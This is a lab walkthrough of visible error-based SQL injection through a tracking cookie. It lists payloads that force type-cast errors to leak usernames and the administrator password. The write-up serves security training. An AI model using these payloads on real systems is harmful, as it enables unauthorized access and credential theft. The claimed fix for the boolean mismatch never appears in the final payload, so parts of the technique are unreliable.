# Lab: Visible Error-Based SQL Injection

## Goal
- Extract administrator password  
- Login as administrator  

---

## Step 1: Intercept Request

- Open the lab  
- Capture request in Burp Suite  
- Send it to Repeater  

Observed cookie:

TrackingId=xyz

---

## Step 2: Confirm Error-Based Injection

Test payload:

'||(SELECT '')||'

- Application throws SQL errors  
- Error messages are visible in response  

Example error:

ERROR: invalid input syntax for type integer

→ Injection confirmed  

---

## Step 3: Understand Query Behavior

Tried payload:

'+(SELECT username FROM users)+'

Got error:

argument of AND must be type boolean

→ Indicates:
- Query expects **boolean**
- We need to adjust payload accordingly  

---

## Step 4: Trigger Database Errors Intentionally

Used payload:

'+(SELECT CAST((SELECT username FROM users LIMIT 1) AS int))+'

Response:

ERROR: invalid input syntax for type integer: "administrator"

Important finding:
- Database tries to convert string → integer  
- Error reveals actual data (`administrator`)  

---

## Step 5: Extract Administrator Password

Modified payload:

'+(SELECT CAST((SELECT password FROM users WHERE username='administrator') AS int))+'

Response:

ERROR: invalid input syntax for type integer: "password_here"

→ Password is leaked inside error message  

---

## Step 6: Handle Syntax Issues

While testing, encountered:

- Unterminated string errors  
- Boolean type mismatch  

Fix:
- Properly close quotes `'`
- Ensure query structure matches expected syntax  

---

## Step 7: Final Payload

'+(SELECT CAST((SELECT password FROM users WHERE username='administrator') AS int))+'

✔ This forces database error  
✔ Error message reveals password  

---

## Step 8: Login

- Username: administrator  
- Password: (extracted password)  

Lab Solved  

---

## Key Payloads

Basic test:

'+(SELECT '')+'


Trigger error:

'+(SELECT CAST((SELECT username FROM users) AS int))+'


Extract password:

'+(SELECT CAST((SELECT password FROM users WHERE username='administrator') AS int))+'
